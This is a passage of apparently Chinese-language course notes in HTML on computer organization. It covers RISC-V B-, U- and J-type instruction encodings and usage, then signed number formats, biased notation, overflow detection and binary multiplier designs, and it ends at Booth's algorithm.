<ul>
<li>使用格式 <code>sw rs2,imm(rs1)</code>  <code>M[rs1 + imm] = rs2</code></li>
<li>将<code>rs2</code>存到内存的<code>rs1+imm</code>地址处</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="tabbed-block">
<p>在RISC-V指令集中，B型（B-type）指令用于条件分支，根据比较结果决定是否跳转到指定的偏移地址。B型指令通常包含两个寄存器进行比较以及一个立即数偏移量（表示跳转的距离）。
<table class="riscv-table">
<tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">25</td>
     <td class="riscv-table-numnodel">24</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">20</td>
     <td class="riscv-table-numnodel">19</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">15</td>
     <td class="riscv-table-numnodel">14</td>
     <td class="riscv-table-numnode" colspan="1"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
     <td colspan="7" class="riscv-table-node">imm[12,10:5]</td>
     <td colspan="5" class="riscv-table-node">rs2</td>
     <td colspan="5" class="riscv-table-node">rs1</td>
     <td colspan="3" class="riscv-table-node">funct3</td>
     <td colspan="5" class="riscv-table-node">imm[4:1,11]</td>
     <td colspan="7" class="riscv-table-node">opcode</td>
</tr>
</table></p>
<p>立即数为
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-co-wk3-__codelineno-3-1"></a><span class="n">imm</span><span class="o">=</span><span class="p">{{</span><span class="mh">19</span><span class="p">{</span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="p">]}},</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="p">],</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">7</span><span class="p">],</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">30</span><span class="o">:</span><span class="mh">25</span><span class="p">],</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">11</span><span class="o">:</span><span class="mh">8</span><span class="p">],</span><span class="w"> </span><span class="mh">1</span><span class="mb">&#39;b0</span><span class="p">}</span>
</span></code></pre></div>
最低位为0，不存；扩展到imm[12]位；将13位拼接完后，剩下高19位用<code>inst[31]</code>符号位填充,此时imm[11]可以不是符号位；imm[12]是符号位</p>
<div class="admonition info">
<p class="admonition-title">常用的B-type指令</p>
<div class="tabbed-set tabbed-alternate" data-tabs="5:6"><input checked="checked" id="note-co-wk3-risc-v-beq" name="note-co-wk3-__tabbed_5" type="radio" /><input id="note-co-wk3-risc-v-bne" name="note-co-wk3-__tabbed_5" type="radio" /><input id="note-co-wk3-risc-v-blt" name="note-co-wk3-__tabbed_5" type="radio" /><input id="note-co-wk3-risc-v-bge" name="note-co-wk3-__tabbed_5" type="radio" /><input id="note-co-wk3-risc-v-bltu" name="note-co-wk3-__tabbed_5" type="radio" /><input id="note-co-wk3-risc-v-bgeu" name="note-co-wk3-__tabbed_5" type="radio" /><div class="tabbed-labels"><label for="note-co-wk3-risc-v-beq">BEQ</label><label for="note-co-wk3-risc-v-bne">BNE</label><label for="note-co-wk3-risc-v-blt">BLT</label><label for="note-co-wk3-risc-v-bge">BGE</label><label for="note-co-wk3-risc-v-bltu">BLTU</label><label for="note-co-wk3-risc-v-bgeu">BGEU</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">imm[12,10:5]</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">000</td>
      <td colspan="5" class="riscv-table-node-little">imm[4:1,11]</td>
      <td colspan="7" class="riscv-table-node-little">1100011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式:<code>beq rs1,rs2,imm</code>  <code>if(rs1 == rs2) pc = pc + imm</code></li>
<li>可以跳转到<span class="arithmatex">\(\pm 2^{12}Byte\)</span>的位置,即<span class="arithmatex">\(\pm 4KiB\)</span></li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">25</td>
    <td class="riscv-table-numnodel">24</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="7" class="riscv-table-node-little">imm[12,10:5]</td>
    <td colspan="5" class="riscv-table-node-little">rs2</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">001</td>
    <td colspan="5" class="riscv-table-node-little">imm[4:1,11]</td>
    <td colspan="7" class="riscv-table-node-little">1100011</td>
</tr>
</table></p>
<ul>
<li>使用格式:<code>bne rs1,rs2,imm</code>  <code>if(rs1 != rs2) pc = pc + imm</code></li>
<li>可以跳转到<span class="arithmatex">\(\pm 2^{12}Byte\)</span>的位置,即<span class="arithmatex">\(\pm 4KiB\)</span></li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">imm[12,10:5]</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">100</td>
      <td colspan="5" class="riscv-table-node-little">imm[4:1,11]</td>
      <td colspan="7" class="riscv-table-node-little">1100011</td>
  </tr>
  </table>  </p>
<ul>
<li>使用格式:<code>blt rs1,rs2,imm</code>  <code>if($signed(rs1) &lt; $signed(rs2)) pc = pc + imm</code></li>
<li>有符号数           </li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
 <tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">25</td>
     <td class="riscv-table-numnodel">24</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">20</td>
     <td class="riscv-table-numnodel">19</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">15</td>
     <td class="riscv-table-numnodel">14</td>
     <td class="riscv-table-numnode" colspan="1"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
 </tr>
 <tr>
     <td colspan="7" class="riscv-table-node-little">imm[12,10:5]</td>
     <td colspan="5" class="riscv-table-node-little">rs2</td>
     <td colspan="5" class="riscv-table-node-little">rs1</td>
     <td colspan="3" class="riscv-table-node-little">101</td>
     <td colspan="5" class="riscv-table-node-little">imm[4:1,11]</td>
     <td colspan="7" class="riscv-table-node-little">1100011</td>
 </tr>
 </table> </p>
<ul>
<li>使用格式:<code>bge rs1,rs2,imm</code>  <code>if($signed(rs1) &gt;= $signed(rs2)) pc = pc + imm</code></li>
<li>有符号数</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
   <tr>
       <td class="riscv-table-numnodel">31</td>
       <td class="riscv-table-numnode" colspan="5"></td>
       <td class="riscv-table-numnoder">25</td>
       <td class="riscv-table-numnodel">24</td>
       <td class="riscv-table-numnode" colspan="3"></td>
       <td class="riscv-table-numnoder">20</td>
       <td class="riscv-table-numnodel">19</td>
       <td class="riscv-table-numnode" colspan="3"></td>
       <td class="riscv-table-numnoder">15</td>
       <td class="riscv-table-numnodel">14</td>
       <td class="riscv-table-numnode" colspan="1"></td>
       <td class="riscv-table-numnoder">12</td>
       <td class="riscv-table-numnodel">11</td>
       <td class="riscv-table-numnode" colspan="3"></td>
       <td class="riscv-table-numnoder">7</td>
       <td class="riscv-table-numnodel">6</td>
       <td class="riscv-table-numnode" colspan="5"></td>
       <td class="riscv-table-numnoder">0</td>
   </tr>
   <tr>
       <td colspan="7" class="riscv-table-node-little">imm[12,10:5]</td>
       <td colspan="5" class="riscv-table-node-little">rs2</td>
       <td colspan="5" class="riscv-table-node-little">rs1</td>
       <td colspan="3" class="riscv-table-node-little">110</td>
       <td colspan="5" class="riscv-table-node-little">imm[4:1,11]</td>
       <td colspan="7" class="riscv-table-node-little">1100011</td>
   </tr>
   </table></p>
<ul>
<li>使用格式:<code>bltu rs1,rs2,imm</code>  <code>if(rs1 &lt; rs2) pc = pc + imm</code></li>
<li>无符号数比较</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
 <tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">25</td>
     <td class="riscv-table-numnodel">24</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">20</td>
     <td class="riscv-table-numnodel">19</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">15</td>
     <td class="riscv-table-numnodel">14</td>
     <td class="riscv-table-numnode" colspan="1"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
 </tr>
 <tr>
     <td colspan="7" class="riscv-table-node-little">imm[12,10:5]</td>
     <td colspan="5" class="riscv-table-node-little">rs2</td>
     <td colspan="5" class="riscv-table-node-little">rs1</td>
     <td colspan="3" class="riscv-table-node-little">111</td>
     <td colspan="5" class="riscv-table-node-little">imm[4:1,11]</td>
     <td colspan="7" class="riscv-table-node-little">1100011</td>
 </tr>
 </table></p>
<ul>
<li>使用格式:<code>bgeu rs1,rs2,imm</code>  <code>if(rs1 &gt;= rs2) pc = pc + imm</code></li>
<li>无符号数比较</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="tabbed-block">
<p><table class="riscv-table">
<tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="18"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
     <td colspan="20" class="riscv-table-node">imm[31:12]</td>
     <td colspan="5" class="riscv-table-node">rd</td>
     <td colspan="7" class="riscv-table-node">opcode</td>
</tr>
</table></p>
<p>没有源操作数，只有目的操作数，立即数为
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-co-wk3-__codelineno-4-1"></a><span class="n">imm</span><span class="o">=</span><span class="p">{</span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="o">:</span><span class="mh">12</span><span class="p">],</span><span class="w"> </span><span class="mh">12</span><span class="mb">&#39;b0</span><span class="p">}</span>
</span></code></pre></div></p>
<div class="admonition info">
<p class="admonition-title">U-type指令</p>
<div class="tabbed-set tabbed-alternate" data-tabs="6:2"><input checked="checked" id="note-co-wk3-risc-v-lui" name="note-co-wk3-__tabbed_6" type="radio" /><input id="note-co-wk3-risc-v-auipc" name="note-co-wk3-__tabbed_6" type="radio" /><div class="tabbed-labels"><label for="note-co-wk3-risc-v-lui">LUI</label><label for="note-co-wk3-risc-v-auipc">AUIPC</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="18"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="20" class="riscv-table-node-little">imm[31:12]</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0110111</td>
</tr>
</table></p>
<ul>
<li>使用格式 <code>lui rd,imm</code>  <code>rd = imm &lt;&lt; 12</code></li>
<li>将<code>imm</code>位存入<code>rd</code>高20位</li>
<li><code>imm</code>不能超过20位</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="18"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="20" class="riscv-table-node-little">imm[31:12]</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0010111</td>
</tr>
</table></p>
<ul>
<li>使用格式 <code>auipc rd,imm</code>  <code>rd = pc + imm &lt;&lt; 12</code></li>
<li>aupic意思是add upper immediate to pc，将imm 加载到高 20 位，然后加上 pc 值</li>
<li><code>imm</code>不能超过20位</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="tabbed-block">
<p><table class="riscv-table">
<tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="18"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
     <td colspan="20" class="riscv-table-node">imm[20,10:1,11,19:12]</td>
     <td colspan="5" class="riscv-table-node">rd</td>
     <td colspan="7" class="riscv-table-node">opcode</td>
</tr>
</table></p>
<p>立即数为
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-co-wk3-__codelineno-5-1"></a><span class="n">imm</span><span class="o">=</span><span class="p">{{</span><span class="mh">11</span><span class="p">{</span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="p">]}},</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="p">],</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">19</span><span class="o">:</span><span class="mh">12</span><span class="p">],</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">20</span><span class="p">],</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">30</span><span class="o">:</span><span class="mh">21</span><span class="p">],</span><span class="w"> </span><span class="mh">1</span><span class="mb">&#39;b0</span><span class="p">}</span>
</span></code></pre></div>
<code>imm</code>最低位0不存，此时<code>imm[20]</code>是符号位，<code>imm</code>相当于21位有符号数
,跳转范围是<span class="arithmatex">\(\pm 2^{20}\)</span></p>
<div class="admonition info">
<p class="admonition-title">JAL指令</p>
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="18"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="20" class="riscv-table-node-little">imm[20,10:1,11,19:12]</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">1101111</td>
</tr>
</table></p>
<ul>
<li>使用格式 <code>jal rd,imm</code>  <code>rd = pc + 4; pc = pc + imm</code></li>
<li>将<code>pc+4</code>存入<code>rd</code>，然后跳转到<code>pc+imm</code>处</li>
<li>Jal指令的跳转范围是<span class="arithmatex">\(\pm 2^{20}Byte\)</span>，即<span class="arithmatex">\(\pm 1MiB\)</span></li>
</ul>
</div>
</div>
</div>
</div>
</div></section><section class="print-page" id="note-co-wk2" heading-number="2.2.2.4"><h1 id="note-co-wk2-arithmetic-for-computer">Arithmetic for Computer<a class="headerlink" href="#note-co-wk2-arithmetic-for-computer" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3250 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 25 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<h2 id="note-co-wk2-introduction">Introduction<a class="headerlink" href="#note-co-wk2-introduction" title="Permanent link">&para;</a></h2>
<p>计算机中的指令可以分为三类：</p>
<div class="admonition eg">
<p class="admonition-title">memory-reference instructions</p>
<p><code>lw, sw</code>
需要 ALU 计算内存地址 
<code>lw</code>指的是 load word, 从内存中读取一个字，<code>sw</code>指的是 store word, 将一个字存入内存。</p>
</div>
<div class="admonition eg">
<p class="admonition-title">arithmetic-logical instructions</p>
<p><code>add, sub, and, or, xor, slt</code>
需要 ALU 进行计算<br />
<code>slt</code>指的是 set less than, 如果第一个操作数小于第二个操作数，那么将结果设置为 1，否则为 0。</p>
</div>
<div class="admonition eg">
<p class="admonition-title">control flow instructions</p>
<p><code>beq, bne, jal</code>
需要 ALU 进行条件判断<br />
<code>beq</code>指的是 branch equal, 如果两个操作数相等，那么跳转到指定地址。<code>bne</code>指的是 branch not equal, 如果两个操作数不相等，那么跳转到指定地址。<code>jal</code>指的是 jump and link, 跳转到指定地址并将下一条指令的地址存入寄存器。</p>
</div>
<h3 id="note-co-wk2-signed-number-formats">Signed Number Formats(有符号数的表示)<a class="headerlink" href="#note-co-wk2-signed-number-formats" title="Permanent link">&para;</a></h3>
<ul>
<li>Sign and magnitude</li>
<li>2's Complement</li>
<li>1's Complement</li>
<li>Biased notation  </li>
</ul>
<div class="admonition question">
<p class="admonition-title">what is biased notation</p>
<p><strong>偏置表示法</strong>（或 <strong>偏移表示法</strong> ）是一种在计算机科学中常用的数值编码系统，主要用于表示正数和负数。它通过引入一个 <strong>偏置</strong> 或 <strong>偏移量</strong> 到实际数值，使得所有编码的数字都是非负数，这样可以简化硬件实现。在浮点数表示等系统中，这种方法特别有用。</p>
<ul>
<li><strong>偏置或偏移量:</strong> 在编码时给实际数值加上一个固定的偏置。</li>
<li>
<p><strong>编码过程:</strong><br />
 当一个数字要被编码时，需要将其值加上一个固定的偏置。例如，如果偏置是 127，而数字是 -5，那么编码后的值将是 <span class="arithmatex">\(-5 + 127 = 122\)</span>。</p>
</li>
<li>
<p><strong>解码过程:</strong><br />
     当需要解码时，解码器将从编码后的数字中减去偏置，以恢复原始的值。例如，编码值 122 经过解码时，减去 127 得到原始值 <span class="arithmatex">\(-5\)</span>。</p>
</li>
</ul>
<p>假设我们使用 8 位二进制数来表示数字，偏置设定为 127：</p>
<ul>
<li>
<p>编码时：</p>
<ul>
<li>数字 0 编码为 <span class="arithmatex">\(0 + 127 = 127\)</span>，即二进制表示为 <code>01111111</code></li>
<li>数字 5 编码为 <span class="arithmatex">\(5 + 127 = 132\)</span>，即二进制表示为 <code>10000100</code></li>
<li>数字 -3 编码为 <span class="arithmatex">\(-3 + 127 = 124\)</span>，即二进制表示为 <code>01111100</code></li>
</ul>
</li>
<li>
<p>解码时：</p>
<ul>
<li>如果读取到 <code>01111111</code>，对应的值为 <span class="arithmatex">\(127 - 127 = 0\)</span></li>
<li>如果读取到 <code>10000100</code>，对应的值为 <span class="arithmatex">\(132 - 127 = 5\)</span></li>
<li>如果读取到 <code>01111100</code>，对应的值为 <span class="arithmatex">\(124 - 127 = -3\)</span></li>
</ul>
</li>
<li>
<p>应用场景：</p>
</li>
</ul>
<p>偏置表示法常用于 <strong>浮点数表示</strong>，尤其是在IEEE 754 标准中，浮点数的指数部分使用了偏置表示法。这使得指数可以同时表示正数和负数，简化了硬件电路的设计与实现。</p>
<p>偏置表示法通过添加一个固定的偏移量，使数值表示更加方便，特别是在底层硬件实现上有较大优势。</p>
</div>
<div class="admonition example">
<p class="admonition-title">Why we need biased notation</p>
<p><div align=center> <img src="http://cdn.hobbitqia.cc/202303061541842.png" width = 65%/> </div>  </p>
<p>上图是 32 位的二进制补码表示，我们可以看到左侧二进制表示，如果看作无符号数，那他们是从小到大排列的；但右侧对应的十进制整数确实分段单增的。<br />
 我们希望有一种这样的表示，能够让右侧的对应的值也单调递增。<br />
 一个想法是对右侧数加上 <span class="arithmatex">\(2^{31}\)</span>, 相当于其二进制表示下最高位翻转。  </p>
</div>
<div class="admonition key-point">
<p class="admonition-title">计算偏移码</p>
<p>在没有说明的情况下，<span class="arithmatex">\([X]_b = 2^n + X\)</span>  从二进制码到移码，只需要翻转符号位即可。<br />
在 IEEE 标准中，偏移码要加上 <span class="arithmatex">\(2^{n-1}-1\)</span> 而不是 <span class="arithmatex">\(2^{n}\)</span></p>
</div>
<h2 id="note-co-wk2-arithmetic">Arithmetic<a class="headerlink" href="#note-co-wk2-arithmetic" title="Permanent link">&para;</a></h2>
<ul>
<li>Addition</li>
<li>Substraction(通过加法实现，减去一个数等于加上这个数的补码)  </li>
<li>Overflow detection:</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Overflow detection</p>
<p>无符号数的溢出：
<div align=center> <img src="../NOTE/CO/pc/1.png" width = 25%/> </div><br />
有符号数的溢出：
 <div align=center> <img src="../NOTE/CO/pc/2.png" width = 25%/> </div><br />
在二进制加减法中，溢出（Overflow）是指计算结果超出了可表示的数值范围，通常发生在 <strong>有符号数</strong> 运算中。</p>
<p>在设计加减法器时，通常在数据位的基础上再增加一位用于判断是否溢出或者进位。这一位通常称为 <strong>溢出位</strong>（Overflow Bit）或 <strong>进位位</strong>（Carry Bit）。</p>
<p>有符号数的溢出有以下几种情况</p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Operand A</th>
<th>Operand B</th>
<th>Result overflow</th>
</tr>
</thead>
<tbody>
<tr>
<td>A + B</td>
<td>≥ 0</td>
<td>≥ 0</td>
<td>&lt; 0 (01)</td>
</tr>
<tr>
<td>A + B</td>
<td>&lt; 0</td>
<td>&lt; 0</td>
<td>≥ 0 (10)</td>
</tr>
<tr>
<td>A - B</td>
<td>≥ 0</td>
<td>&lt; 0</td>
<td>&lt; 0 (01)</td>
</tr>
<tr>
<td>A - B</td>
<td>&lt; 0</td>
<td>≥ 0</td>
<td>≥ 0 (10)</td>
</tr>
</tbody>
</table>
<p>可以发现，溢出时<span class="arithmatex">\(C_n \oplus C_{n-1}\)</span>即进位位和最高位的异或结果为1。</p>
<p>而对于无符号数，只有一种情况会发生溢出，即结果大于可表示的最大值，carry bit为1。</p>
</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>当ALU使用的是加减法操作时，才有<span class="arithmatex">\(C_n \oplus C_{n-1}\)</span></p>
</div>
<p>Constructing an ALU </p>
<div align=center> <img src="http://cdn.hobbitqia.cc/202303101703212.png" width = 45%/> </div>

<p>注: RISC-V 不支持 nor 指令。</p>
<h3 id="note-co-wk2-multiplication">Multiplication<a class="headerlink" href="#note-co-wk2-multiplication" title="Permanent link">&para;</a></h3>
<h4 id="note-co-wk2-unsigned-multiplication">Unsigned multiplication<a class="headerlink" href="#note-co-wk2-unsigned-multiplication" title="Permanent link">&para;</a></h4>
<div class="arithmatex">\[ Multiplicand   \times Multiplier = Product\]</div>
<details class="note">
<summary>Version 1</summary>
<p>第一种乘法器，判断乘数的最低位是否为 1，如果是则被乘数加部分和存到结果里面，否则加0。每次左移被乘数，右移乘数。
<div align=center> <img src="../NOTE/CO/pc/3.png" width = 55%/> </div>
但是这种乘法器对于32位的乘法却需要 64位的寄存器存储被乘数，如下：
<div align=center> <img src="../NOTE/CO/pc/4.png" width = 60%/> </div><br />
需要 64+64+32 bit 的寄存器，和一个 64 bit ALU.  </p>
</details>
<details class="note">
<summary>Version 2</summary>
<p>在Version1中，实际上每次进行的加法都是32位的，每次加完以后，product的最低位就不会变化，因此我们可以使用32位的ALU，每次右移product而不是左移乘数，然后让乘数与product相加即可。
  这样原本需要64+64+32 bit 的寄存器，和一个 64 bit ALU. 变成了 32+64+32 bit 的寄存器，和一个 32 bit ALU.
  <div align=center> <img src="../NOTE/CO/pc/5.png" width = 60%/> </div>  </p>
</details>
<details class="definition">
<summary>Version3</summary>
<p>Version2中，64位的product每次右移，其中只有高32位有用，那么低32位恰好可以用来存放乘数。这样我们就可以只用32位的寄存器和ALU来实现乘法。
<div align=center> <img src="../NOTE/CO/pc/6.png" width = 60%/> </div>
如下
<div align=center> <img src="../NOTE/CO/pc/7.png" width = 55%/> </div> </p>
</details>
<details class="eg">
<summary>例-4位乘法,高四位结果，低四位乘数</summary>
<p><div align=center> <img src="../NOTE/CO/pc/8.png" width = 55%/> </div>  </p>
</details>
<h4 id="note-co-wk2-signed-multiplication">Signed multiplication<a class="headerlink" href="#note-co-wk2-signed-multiplication" title="Permanent link">&para;</a></h4>
<p>有符号相乘不能直接乘，可以先用符号位决定结果符号，再对绝对值进行乘法。 </p>
<p><strong>Booth's Algorithm</strong>  </p>
<div align=center> <img src="http://cdn.hobbitqia.cc/202303081023374.png" width = 60%/> </div>

<p>思想：如果有一串 1, 减掉乘数的第一个 1, 后面的 1 的序列进行移位，当上一步是最后一个 1 时加。  </p>
